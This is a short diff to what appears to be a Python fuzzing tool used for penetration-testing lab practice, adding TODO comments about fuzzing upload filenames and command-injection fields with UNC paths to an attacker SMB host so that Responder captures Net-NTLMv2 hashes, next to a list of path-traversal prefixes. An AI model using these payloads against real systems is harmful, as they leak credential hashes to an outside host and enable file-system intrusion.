@@ -21,6 +21,9 @@ from .wordlists import wordlist_strip_prefix
 
 # TODO: Update to loop over scan results once (and then free memory after each iteration) to not kill memory on large runs
 #           - Analysis functions should keep their own minimal state during looping
+# TODO: Mode for fuzzing SMB share paths that could reveal Net-NTLMv2 hashes (assuming responder is running)?
+#           - E.g., filename="\\192.168.45.213\a\hello.txt" or filename"\\\\192.168.45.213\\a\\hello.txt". Test on 16.3.3. Cracking Net-NTLMv2 lab 2
+#           - Both for filenames in uploads but also for command injection? Test cmd injection on 16.3.4 Relaying Net-NTLMv2 lab 2
 
 def relpath_linux(args):
     return [b"", b"../", b"../../", b"../../../", b"../../../../../../../../../../../../", b"/", b"~/"]
